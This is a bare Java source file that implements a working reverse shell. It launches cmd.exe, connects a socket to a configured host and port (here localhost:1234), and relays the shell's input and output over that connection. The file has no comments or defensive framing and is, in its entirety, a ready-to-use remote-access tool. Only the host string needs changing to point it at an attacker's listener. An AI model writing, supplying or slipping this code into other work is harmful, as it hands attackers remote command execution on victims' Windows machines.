

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;


public class Main {

    public static void main(String[] args) throws IOException, InterruptedException {
        String host = "localhost";
        int port = 1234;

        String program = "cmd.exe";

        Process p = new ProcessBuilder(program).redirectErrorStream(true).start();
        Socket s = new Socket(host, port);

        InputStream pi = p.getInputStream();
        InputStream pe = p.getErrorStream();
        InputStream si = s.getInputStream();

        OutputStream po = p.getOutputStream();
        OutputStream so = s.getOutputStream();

        while(!s.isClosed()) {

            while(pi.available() > 0 ) so.write(pi.read());

                while(pe.available() > 0 ) so.write(pe.read());

                    while (si.available() > 0 ) po.write(si.read());

                        so.flush();
                        po.flush();
                        Thread.sleep(30);
                        try {
                            p.exitValue();
                            break;
                        }
                        catch (Exception e) {

                        }
        };
        p.destroy();
        s.close();
    }

}
